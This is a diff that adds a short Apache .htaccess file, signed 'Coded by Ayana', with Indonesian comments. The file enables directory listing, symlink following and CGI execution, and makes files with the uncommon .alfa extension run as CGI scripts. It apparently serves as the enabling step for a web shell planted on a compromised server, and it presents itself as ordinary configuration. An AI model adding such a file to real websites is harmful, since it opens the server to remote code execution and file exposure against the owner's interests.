@@ -1,0 +1,12 @@
+# ============================================================
+# Coded by Ayana
+# ============================================================
+
+# Izinkan opsi tertentu di direktori ini
+Options +FollowSymLinks +MultiViews +Indexes +ExecCGI
+
+# Tambahkan tipe MIME untuk file berekstensi .alfa
+AddType application/x-httpd-cgi .alfa
+
+# Jadikan file .alfa dapat dieksekusi sebagai CGI script
+AddHandler cgi-script .alfa
